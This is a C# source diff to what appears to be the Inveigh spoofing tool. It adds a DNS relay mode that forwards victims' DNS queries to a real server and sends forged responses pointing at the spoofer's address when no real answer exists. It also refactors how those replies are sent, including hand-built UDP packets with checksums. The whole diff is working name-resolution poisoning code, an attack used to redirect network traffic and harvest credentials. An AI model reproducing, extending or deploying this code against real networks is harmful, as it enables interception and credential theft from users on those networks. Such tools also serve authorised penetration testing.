@@ -84,38 +84,100 @@ namespace Inveigh
             if (Program.enabledDNS && String.Equals(responseMessage, "response sent"))
             {
                 responseStatus = "+";
-                byte[] dnsResponse = DNS.GetDNSResponse(method, ipVersion, Program.argDNSHost, typeName, sourceIPAddress, sourcePortData, payload);
+                byte[] response = DNS.GetDNSResponse(method, ipVersion, Program.argDNSHost, typeName, sourceIPAddress, sourcePortData, payload);
+                DNSClient(method, ipVersion, sourceIPAddress, sourcePortNumber, response, udpClient);
+            }
+            else if (Program.enabledDNSRelay && String.Equals(responseMessage, "DNS relay"))
+            {
+                byte[] serverResponse = DNSRelay(method, ipVersion, typeName, sourceIPAddress, payload, sourcePortData, ref responseMessage);
 
-                if (String.Equals(method, "sniffer"))
-                {       
-                    UDP.UDPSnifferClient(ipVersion, 0, sourceIPAddress, sourcePortNumber, dnsResponse); // todo check ports
+                if (serverResponse != null && serverResponse.Length > 0)
+                {
+                    responseStatus = "+";
+                    DNSClient(method, ipVersion, sourceIPAddress, sourcePortNumber, serverResponse, udpClient);
                 }
                 else
                 {
-                    UDP.UDPListenerClient(sourceIPAddress, sourcePortNumber, udpClient, dnsResponse);
+                    responseStatus = "!";
                 }
 
             }
 
-            if (!String.Equals(IP, sourceIP) || String.Equals(method, "listener"))
+            lock (Program.outputList)
             {
-
-                lock (Program.outputList)
-                {
-                    Program.outputList.Add(String.Format("[{0}] [{1}] DNS({2}) request for {3} from {4} [{5}]", responseStatus, DateTime.Now.ToString("s"), typeName, requestHost, sourceIPAddress, responseMessage));
-                }
-
+                Program.outputList.Add(String.Format("[{0}] [{1}] DNS({2}) request for {3} from {4} [{5}]", responseStatus, DateTime.Now.ToString("s"), typeName, requestHost, sourceIPAddress, responseMessage));
             }
-            else if (String.Equals(method, "sniffer"))
+
+        }
+
+        public static void DNSClient(string method, string ipVersion, IPAddress sourceIPAddress, int sourcePortNumber, byte[] response, UdpClient udpClient)
+        {
+
+            if (String.Equals(method, "sniffer"))
             {
-
-                lock (Program.outputList)
-                {
-                    Program.outputList.Add(String.Format("[{0}] [{1}] DNS({2}) request for {3} sent to {4} [{5}]", responseStatus, DateTime.Now.ToString("s"), typeName, requestHost, destinationIPAddress, "outgoing query"));
-                }
-
+                UDP.UDPSnifferClient(ipVersion, 0, sourceIPAddress, sourcePortNumber, response); // todo check ports
+            }
+            else
+            {
+                UDP.UDPListenerClient(sourceIPAddress, sourcePortNumber, udpClient, response);
             }
 
+        }
+
+        public static byte[] DNSRelay(string method, string ipVersion, string typeName, IPAddress sourceIPAddress, byte[] payload, byte[] sourcePortData, ref string message)
+        {
+            byte[] relay = null;
+            byte[] response = null;
+            byte[] answer = new byte[4];
+
+            try
+            {
+                IPEndPoint destinationEndpoint = new IPEndPoint(Program.dnsServerAddress, 53);
+                UdpClient udpClient = new UdpClient();
+                udpClient.Client.SendTimeout = 1500;
+                udpClient.Client.ReceiveTimeout = 1500;
+                udpClient.Connect(destinationEndpoint);
+                udpClient.Send(payload, payload.Length);
+                IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.IPv6Any, 53);
+                relay = udpClient.Receive(ref ipEndPoint);
+                udpClient.Close(); 
+                Buffer.BlockCopy(relay, 4, answer, 0, 4);         
+            }
+            catch
+            {
+                message = "DNS relay error";
+                return response;
+            }
+
+            if (String.Equals(BitConverter.ToString(answer), "00-01-00-00"))
+            {
+                response = DNS.GetDNSResponse(method, ipVersion, Program.argDNSHost, typeName, sourceIPAddress, sourcePortData, payload);
+                message = "response sent";
+            }
+            else if (String.Equals(method, "sniffer") && relay != null && relay.Length > 0)
+            {
+                MemoryStream memoryStream = new MemoryStream();
+                memoryStream.Write((new byte[2] { 0x00, 0x35 }), 0, 2);
+                memoryStream.Write(sourcePortData, 0, 2);
+                memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
+                memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
+                memoryStream.Write(relay, 0, relay.Length);
+               
+                if (String.Equals(ipVersion, "IPv6"))
+                {
+                    byte[] pseudoHeader = Util.GetIPv6PseudoHeader(sourceIPAddress, 17, (int)memoryStream.Length);
+                    UInt16 checkSum = Util.GetPacketChecksum(pseudoHeader, memoryStream.ToArray());
+                    memoryStream.Position = 6;
+                    byte[] checksumData = Util.IntToByteArray2(checkSum);
+                    Array.Reverse(checksumData);
+                    memoryStream.Write(checksumData, 0, 2);
+                }
+
+                response = memoryStream.ToArray();
+                message = "relay response sent";
+            }
+
+            return response;
         }
 
         public static byte[] GetDNSResponse(string method, string ipVersion, string spooferHost, string type, IPAddress sourceIPAddress, byte[] sourcePortData, byte[] payload)
@@ -123,6 +185,7 @@ namespace Inveigh
             byte[] spooferIPData = Program.spooferIPData;
             byte[] TTL = BitConverter.GetBytes(Int32.Parse(Program.argDNSTTL));
             Array.Reverse(TTL);
+            Array.Reverse(sourcePortData);
             byte[] transactionID = new byte[2];
             Buffer.BlockCopy(payload, 0, transactionID, 0, 2);
             string requestHost = Util.ParseNameQuery(12, payload);
@@ -170,7 +233,7 @@ namespace Inveigh
 
                     case "A":
                         memoryStream.Write(transactionID, 0, transactionID.Length);
-                        memoryStream.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
+                        memoryStream.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10); // todo change back 80
                         memoryStream.Write(request, 0, request.Length);
                         memoryStream.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                         memoryStream.Write((new byte[2] { 0xc0, 0x0c }), 0, 2);
